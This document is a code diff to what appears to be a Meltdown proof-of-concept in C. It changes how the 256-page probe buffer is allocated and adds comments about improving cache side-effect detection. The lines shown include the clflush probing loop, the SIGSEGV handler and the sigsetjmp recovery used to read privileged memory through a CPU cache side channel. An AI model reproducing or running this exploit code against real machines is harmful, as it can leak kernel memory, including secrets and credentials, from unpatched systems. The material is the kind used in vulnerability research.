@@ -1,9 +1,11 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <sys/mman.h>
 #include <stdint.h>
+#include <string.h>
+
 #include <signal.h>
 #include <setjmp.h>
+
 
 #define PAGE_SIZE_SHIFT      (0xC)
 #define PAGE_SIZE_SHIFT_STR  "0xC"
@@ -80,13 +82,14 @@ void main()
         address_to_guess_byte = (uintptr_t) local_byte;
     }
 
-    char *meltdown_buf = mmap(NULL, PAGE_SIZE * 256, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, -1, 0);
+    char *meltdown_buf = malloc(PAGE_SIZE * 256);
+    memset(meltdown_buf, 0, PAGE_SIZE * 256); // improves cache side effects detection
 
     signal(SIGSEGV, sigsegv_handler);
 
     for (int i = 0; i < 100; i++) {
         for (int i = 0; i < 256; i++) {
-            clflush(&meltdown_buf[i * PAGE_SIZE]);
+            clflush(&meltdown_buf[i * PAGE_SIZE]); // improves cache side effects detection
         }
 
         if(sigsetjmp(jbuf, !0) == 0) {
